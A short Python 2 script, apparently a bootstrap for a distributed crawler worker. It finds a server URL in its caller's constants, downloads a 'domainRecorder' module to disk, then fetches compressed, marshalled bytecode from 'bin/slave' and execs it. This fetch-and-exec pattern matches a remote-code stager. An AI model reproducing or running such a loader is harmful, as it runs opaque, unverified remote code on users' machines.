import imp
import os


if imp.get_magic() != '\x03\xf3\r\n':
    print "Please update to Python 2.7.3 (http://www.python.org/download/)"
    exit()


import urllib2, marshal, zlib, time, re, sys
try:
    import bs4
except Exception,e:
    print "Please install bs4 (sudo pip install bs4)"
    exit()
    
for k in sys._getframe(1).f_code.co_consts:
    if not isinstance(k, basestring):
        continue
    m = re.match(r"http[s]*://[\w\.]+:[\w]+/", k)
    if m:
        
        count=1
        _F=True
        while _F:
            if count<=0:
                break
            try:
                if os.path.exists('domainRecorder.py'):
                    print "Please delete or rename the domainRecorder.py in your current path!"
                    exit()
                else:
                    try:
                        content=urllib2.urlopen(m.group(0)+'bin/domainRecorder').read()
                        with open('domainRecorder.py','wb') as file:
                            file.write(content)
                    except Exception,e:
                        exit() 
                    exec marshal.loads(zlib.decompress(urllib2.urlopen(m.group(0)+'bin/slave').read()))           
            except:
                raise
                # raise
                # time.sleep(100)
            
            count=count-1
        
